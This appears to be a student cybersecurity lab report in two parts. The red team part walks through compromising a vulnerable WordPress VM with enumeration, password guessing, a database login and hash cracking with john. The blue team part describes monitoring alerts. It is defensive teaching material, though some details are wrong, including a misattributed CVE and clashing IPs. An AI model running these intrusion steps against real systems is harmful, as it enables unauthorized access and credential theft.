# Cybersecurity Red &amp; Blue Teaming Project

## Red Team: Summary of Operations
### Table of Contents ##

*Exposed Services*

*Critical Vulnerabilities*

*Exploitation*

*Exposed Services*

**Nmap scan results for each machine reveal the below services and OS details:**
  __nmap -A 192.168.1.110 or nmap -sV 192.168.1.110__
  ![Nmap Scan Output](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/Screen%20Shot%202022-03-14%20at%208.17.28%20PM.png)
  ![Nmap Scan Output 2](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/Screen%20Shot%202022-03-14%20at%208.19.16%20PM.png)


This scan identifies the services below as potential points of entry:
Target 1

**List of Exposed Services: Upon doing an nmap scan of the network, the following exposed services were revealed**

22/TCP SSH -> OpenSSH

80/TCP HTTP -> Apache

111/TCP RPCBIND -> 2-4 RPC #100000

139/TCP Netbios-SSN -> Samba smbd 3.x - 4.x

445/TCP Netbios-SSN -> Samba smbd 3.x - 4.x

Other Exposed Info: MAC Address: 00:15:5D:00:04:10 (Microsoft)


**List of Critical Vulnerabilities**

Weak/Improper Authentication Restrictions (CWE-307)

Weak MD5 Hashing for Wordpress (CVE-2012-6706)

Improper Privilege Managements (CWE-269)

**Exploitation**

Target 1: 

The Red Team was able to penetrate Target 1 and retrieve the following confidential data.

flag1 hash: b9bbcb33e11b80be759c4e844862482d

The commands used were:

wp-scan --url http://192.168.1.110/wordpress --enumerate u

ssh michael@192.168.1.110 -p22

Guessed password to be "michael"

grep -rl 'flag1*'

located in /var/www/html/service.html


![Flag 1 located on page source](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/Screen%20Shot%202022-03-14%20at%209.02.16%20PM.png)


Exploit Used:

![Wordpress Enumeration](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/Wordpress%20Enumeration.png) 

![Wordpress Enumeration Users Identified](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/Users%20ID'd.png)


flag2 hash: fc3fd58dcdad9ab23faca6e9a36e581c

The commands used were:
(while in Michael's session via ssh)

cd /var

cd /wwww

ls flag2.txt

cat txt file

![Flag 2](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/Flag%202.png)

flag3 hash: afc01ab56b50591e7dccf93122770cd2

The commands used were:
(while in Michael's session via ssh)
cd /var/www/html/wordpress

login to Wordpress databse using "mysql -h localhost root -p wordpress"

password is R@venSecurity

once in DB, "SHOW TABLES;"

SELECT * FROM wp_posts;

![DB login info](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/SQL%20DB%20Config.png)

![Password for database](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/SQL%20DB%20Login%20info.png)


flag4 hash: 715dea6c055b9fe3337544932f2941ce3

The commands used were:
(while logged in the database)

mysql> select * from wp_users;

select user_login, user_pass, from wp_users;

copy and paste values into attacker machine and create file

using newly created wordlist, use command: john --wordlist=/usr/share/wordlists/rockyou.txt hashedusers.txt

this out puts user Steven's password

login as steven > ssh steven@192.168.1.110 -p 22

sudo -l

cd /

find -name 'flag*.txt'





# Blue Team: Summary of Operations

## Table of Contents
- Network Topology
- Description of Targets
- Monitoring the Targets
- Patterns of Traffic & Behavior
- Suggestions for Going Further

### Network Topology
The following machines were identified on the network:
- Kali Machine/Attacking Machine
  - **Operating System**: Linux
  - **Purpose**: Attacker
  - **IP Address**: 192.168.1.90
- Target/Victim:
  - **Operating System**: Linux
  - **Purpose**: Target Machine
  - **IP Address**: 192.168.1.100

- ELK:
  - **Operating System**: Linux
  - **Purpose**: Logs events
  - **IP Address**: 192.168.1.110

### Description of Targets
The target of this attack was: *`Target 1` 192.168.1.110*

Target 1 is an Apache web server and has SSH enabled, so ports 80 and 22 are possible ports of entry for attackers. As such, the following alerts have been implemented:

### Monitoring the Targets

Traffic to these services should be carefully monitored. To this end, we have implemented the alerts below:
#### Excessive HTTP Errors is implemented as follows:
  - **Metric**: Packetbeat
  - **Threshold**: 400 Response Status Codes
  - **Vulnerability Mitigated**: Brute Force Attacks
  - **Reliability**: This should not generate too many false positives, as the threshold is set accurately.

#### HTTP Request Size Monitor is implemented as follows:
  - **Metric**: Packetbeat
  - **Threshold**: 3500 bytes
  - **Vulnerability Mitigated**: 
  - **Reliability**: This is quite reliable, as the threshold has been set accurately.

#### CPU Usage Monitor is implemented as follows:
  - **Metric**: Metricbeat
  - **Threshold**: .5
  - **Vulnerability Mitigated**: Malware, cryptomining 
  - **Reliability**: This is quite reliable, as the CPU usage should has been established.
### Suggestions for Going Further (Optional)
_TODO_: 
- Each alert above pertains to a specific vulnerability/exploit. Recall that alerts only detect malicious behavior, but do not stop it. For each vulnerability/exploit identified by the alerts above, suggest a patch. E.g., implementing a blocklist is an effective tactic against brute-force attacks. It is not necessary to explain _how_ to implement each patch.
